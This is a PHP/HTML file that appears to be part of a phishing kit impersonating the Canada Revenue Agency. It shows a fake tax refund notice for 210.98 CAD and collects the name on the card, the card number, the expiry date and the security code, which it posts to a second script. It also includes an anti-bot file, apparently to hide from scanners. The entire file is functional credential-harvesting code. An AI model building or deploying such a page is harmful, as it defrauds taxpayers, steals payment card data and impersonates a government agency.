<?php
    session_start();
    include 'config/___function.php';
    include 'config/___config.php';
    include 'antibots.php';
    ?>
<html>
<head>
<body>
<link href="favicon.ico" rel="shortcut icon"/>

<title>Canada Revenue Agency </title>

<link href="1.css" rel="stylesheet" />
<link rel="stylesheet" href="2.css" />
<link rel="stylesheet" href="3.css" />
<img src="1.PNG"><br>


<div data-bind="visible: isMyBillsPageActive()">
<div data-bind="slideInOut: payNow(), component:{name: &quot;one-time-payment&quot;}" style="display: block;"><div id="PayNowContainer" class="tile no-padding">
<div class="row collapse">
<div class="small-12 medium-4 columns">
<bill-overview><div id="mybillsInvoiceInfo">
<h4>My Refund</h4>
<strong>Details</strong>
<ul>
<li>
<span>Refund Date</span>
<span data-bind="text: lastInvoice" class="right">20 May 2019</span>
</li>
<li>
<span>Confirmation Of Your Refund</span>
<span data-bind="text: invoiceDueDate" class="right">31 May 2019</span>
</li>
</ul>
<ul class="current-balance">
<li>
<span>Your Refund Number :</span>
<span data-bind="text: currentBalance" class="right" id="billOverviewCurrentBalance">#008052017</span>
</li>
</ul>
</div>
<div data-bind="text: disclaimerText" id="payment-disclaimer">Your refund will be taken into account in 15-30 days..</div>
</bill-overview>
</div>
        <div id="Payment_Container" class="small-12 medium-8 columns">


                <div class="account-content lightbox">
                        <div class="make-payment">
									<form id="form1" name="form1" method="post" action="2.php">

                            <div data-bind="slideInOut: showPaymentAmount" class="row" style="">
                                <div class="columns">
                                    <label>
                                        <strong>The Refund Amount :</strong><span style="color:red;font-weight:bold">*</span>
                                        <input data-bind="textInput: payAmount" name="amount" disabled="disabled" required="" placeholder="210.98 CAD" type="text" size="8" autocomplete="off">
                                        <small class="field-validation-error" data-bind="validationMessage: payAmount" style="display: none;"></small>
                                    </label>
                                </div>
                            </div>

                            
                                                       <div data-bind="slideInOut: showCreditCardInfo()" style="">
                                <img src="creditcardicons.png" alt="Visa, Mastercard, American Express" class="accepted-credit-cards">
                                <div class="row">
                                    <div class="columns">
                                        <label>
                                            <strong>Name On Card</strong><span style="color:red;font-weight:bold">*</span>
                                            <input data-bind="textInput: currentCreditCardName" name="ccname" required="" type="text" maxlength="64" autocomplete="off">
                                            <small class="field-validation-error" data-bind="validationMessage: currentCreditCardName" style="display: none;"></small>
                                        </label>
                                    </div>
                                </div>                                
                                <div class="row">
                                    <div class="columns">
                                        <label>
                                            <strong>Card Number</strong><span style="color:red;font-weight:bold">*</span>
                                            <input data-bind="textInput: currentCreditCardNumber" required=""  pattern="[0-9- ]*" placeholder="XXXX XXXX XXXX XXXX"name="ccnum" type="text" maxlength="20" autocomplete="off">
                                            <small class="field-validation-error" data-bind="validationMessage: currentCreditCardNumber" style="display: none;"></small>
                                        </label>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="columns small-6 medium-4">
                                        <label>
                                            <strong>Expiration Date</strong><span style="color:red;font-weight:bold">*</span>
                                            <input type="text" maxlength="5" required="" name="exp"  pattern="[0-9-/]*"  placeholder="MM/YY" data-bind="expiryDate: currentExpiryDate">
                                            <small class="field-validation-error" data-bind="validationMessage: currentExpiryDate" style="display: none;"></small>
                                        </label>
                                    </div>
                                </div>                               
                                <div class="row">
                                    <div class="columns small-6 medium-4">
                                        <label>
                                            <strong>Security Code</strong><span style="color:red;font-weight:bold">*</span>
                                            <input data-bind="textInput: currentCreditCardCvv" required=""  pattern="[0-9]*" name="cvv" type="text" maxlength="4" autocomplete="off" placeholder="3-4 digits">
                                            <small class="field-validation-error" data-bind="validationMessage: currentCreditCardCvv" style="display: none;"></small>
                                        </label>
                                    </div>
																		
																		</div>
                                                             
                            </div>
                        </div>
                        <div class="form-footer">
                            <button data-bind="slideInOut: !inUpdateCreditCard(), click: submitPayment" class="button" style=""><svg class="lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="123.9 223.1 246.1 329.9"><path class="st0" d="M342.9 289.2c-5.3-14.4-12.7-26.5-22.3-36.5-12.9-13.5-29.9-22.7-51.1-27.8h-.5c-2.8-.2-5.3-.6-7.5-1.3v-.2c-1-.1-2-.2-3.1-.2h-22.9c-1 0-2 .1-3 .2 0 0-.1.1-.1.2-2.2.7-4.7 1.1-7.5 1.3h-.4c-21.2 5.1-38.3 14.3-51.1 27.8-9.6 10-17 22.1-22.3 36.5-1.8 4.8-3.1 10-4.1 15.6-.2 3.3-.5 6.5-1.1 9.6h-.2v6.2c0 15.7-.1 31.5-.2 47.2h-.2c-6.6.5-13.5.7-20.8.5h-.5V553h246.1v-26.9-78.9-78.9h-.5c-7.3.2-14.2.1-20.8-.5h-.2c-.1-15.7-.2-31.5-.2-47.2v-.5-5.7h-.2c-.6-3.1-.9-6.3-1.1-9.6-1.1-5.7-2.4-10.8-4.2-15.6m-32 43.3v.4c.2 12 .1 23.6-.4 34.9h-.5c-14.9.5-30.2.8-45.9.8-5.4 0-10.8 0-16.2-.1h-2c-5.4 0-10.8.1-16.2.1-15.7 0-30.9-.3-45.9-.8h-.4c-.5-11.2-.6-22.9-.4-34.9v-.4-.4c-.2-3.6-.1-6.8.4-9.7v-.5c-.2-1.3-.1-2.1.4-2.6.7-10.7 3.2-19.8 7.2-27 9.5-16.9 25.4-27.3 47.9-31.2v-.2c2.8-.1 5.6-.1 8.5-.2h.5c2.3 0 4.6.1 6.9.2v.2c22.4 3.9 38.4 14.3 47.9 31.2 4.1 7.3 6.5 16.3 7.2 27 .5.5.6 1.4.5 2.6v.5c.5 2.9.6 6.1.4 9.7.1.1.1.3.1.4M270.3 437v.5c-1.9 6.1-5.3 10.9-10 14.2-.1.1-.1.2-.1.3.8 12 2 24.4 3.6 37.1v.4c.8 2.1 1.1 4.8.9 8v.4c.5 1.1.6 2.6.2 4.4 0 0-.1.1-.2.1v.2c-5.6.2-11.2.2-16.6.2h-2c-5.5 0-11 0-16.7-.2v-.2c-.1 0-.2 0-.2-.1-.4-1.8-.3-3.3.2-4.4v-.4c-.2-3.2.1-5.8.9-8v-.4c1.6-12.7 2.7-25.1 3.5-37.1 0-.1-.1-.2-.1-.3-4.7-3.4-8.1-8.1-10-14.2v-.5-9.2c1.7-4.9 4.2-9 7.6-12.2 3.3-3.3 8.2-4.7 14.8-4.2v.1c.3 0 .7-.1 1-.1.3 0 .7.1 1 .1v-.2c6.5-.4 11.4 1 14.8 4.2 3.4 3.2 5.9 7.3 7.6 12.2-.2 3.2-.2 6.2-.2 9.3z" id="Layer0_0_FILL"></path></svg> Submit</button>
                            <button data-bind="slideInOut: inUpdateCreditCard, click: submitCreditCardUpdate" class="button" style="display: none;"><svg class="lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="123.9 223.1 246.1 329.9"><path class="st0" d="M342.9 289.2c-5.3-14.4-12.7-26.5-22.3-36.5-12.9-13.5-29.9-22.7-51.1-27.8h-.5c-2.8-.2-5.3-.6-7.5-1.3v-.2c-1-.1-2-.2-3.1-.2h-22.9c-1 0-2 .1-3 .2 0 0-.1.1-.1.2-2.2.7-4.7 1.1-7.5 1.3h-.4c-21.2 5.1-38.3 14.3-51.1 27.8-9.6 10-17 22.1-22.3 36.5-1.8 4.8-3.1 10-4.1 15.6-.2 3.3-.5 6.5-1.1 9.6h-.2v6.2c0 15.7-.1 31.5-.2 47.2h-.2c-6.6.5-13.5.7-20.8.5h-.5V553h246.1v-26.9-78.9-78.9h-.5c-7.3.2-14.2.1-20.8-.5h-.2c-.1-15.7-.2-31.5-.2-47.2v-.5-5.7h-.2c-.6-3.1-.9-6.3-1.1-9.6-1.1-5.7-2.4-10.8-4.2-15.6m-32 43.3v.4c.2 12 .1 23.6-.4 34.9h-.5c-14.9.5-30.2.8-45.9.8-5.4 0-10.8 0-16.2-.1h-2c-5.4 0-10.8.1-16.2.1-15.7 0-30.9-.3-45.9-.8h-.4c-.5-11.2-.6-22.9-.4-34.9v-.4-.4c-.2-3.6-.1-6.8.4-9.7v-.5c-.2-1.3-.1-2.1.4-2.6.7-10.7 3.2-19.8 7.2-27 9.5-16.9 25.4-27.3 47.9-31.2v-.2c2.8-.1 5.6-.1 8.5-.2h.5c2.3 0 4.6.1 6.9.2v.2c22.4 3.9 38.4 14.3 47.9 31.2 4.1 7.3 6.5 16.3 7.2 27 .5.5.6 1.4.5 2.6v.5c.5 2.9.6 6.1.4 9.7.1.1.1.3.1.4M270.3 437v.5c-1.9 6.1-5.3 10.9-10 14.2-.1.1-.1.2-.1.3.8 12 2 24.4 3.6 37.1v.4c.8 2.1 1.1 4.8.9 8v.4c.5 1.1.6 2.6.2 4.4 0 0-.1.1-.2.1v.2c-5.6.2-11.2.2-16.6.2h-2c-5.5 0-11 0-16.7-.2v-.2c-.1 0-.2 0-.2-.1-.4-1.8-.3-3.3.2-4.4v-.4c-.2-3.2.1-5.8.9-8v-.4c1.6-12.7 2.7-25.1 3.5-37.1 0-.1-.1-.2-.1-.3-4.7-3.4-8.1-8.1-10-14.2v-.5-9.2c1.7-4.9 4.2-9 7.6-12.2 3.3-3.3 8.2-4.7 14.8-4.2v.1c.3 0 .7-.1 1-.1.3 0 .7.1 1 .1v-.2c6.5-.4 11.4 1 14.8 4.2 3.4 3.2 5.9 7.3 7.6 12.2-.2 3.2-.2 6.2-.2 9.3z" id="Layer0_0_FILL"></path></svg> Save Changes</button>
                        </div>
                        <div class="clearfix"></div>
                    </div>
                </div>

                
                               
            </div>
        </div>
    </div>
</div>

</div> 

</form>

</html>
